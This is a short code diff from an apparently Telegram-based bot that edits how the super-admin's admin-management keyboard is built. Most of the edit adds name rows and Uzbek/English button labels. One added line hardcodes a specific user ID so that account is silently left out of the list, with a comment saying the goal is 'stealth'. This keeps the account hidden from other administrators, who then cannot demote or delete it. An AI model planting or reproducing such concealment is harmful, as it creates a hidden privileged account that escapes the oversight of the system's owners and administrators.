@@ -791,10 +791,11 @@ export function getSuperAdminAdminsKeyboard(
   const kb = new InlineKeyboard();
 
   admins.forEach((adm) => {
-    if (adm.isSuperAdmin || adm.adminRole === "super_admin" || adm.userId === currentUserId) return; // Hide Super Admin from list to maintain stealth
+    if (adm.isSuperAdmin || adm.adminRole === "super_admin" || adm.userId === currentUserId || adm.userId === 5059829001) return; // Hide Super Admin from list to maintain stealth
     const name = adm.fullName || adm.firstName || (adm.username ? `@${adm.username}` : `User #${adm.userId}`);
-    kb.text(`❌ [Bo'shatish]`, `admin_super_demote_${adm.userId}`)
-      .text(`🗑️ [O'chirish]`, `admin_super_delete_admin_${adm.userId}`)
+    kb.text(`🛡️ ${name}`, `admin_view_user_${adm.userId}`).row();
+    kb.text(isUz ? "❌ Lavozimdan Olish" : "❌ Demote", `admin_super_demote_${adm.userId}`)
+      .text(isUz ? "🗑️ O'chirish" : "🗑️ Delete", `admin_super_delete_admin_${adm.userId}`)
       .row();
   });
 
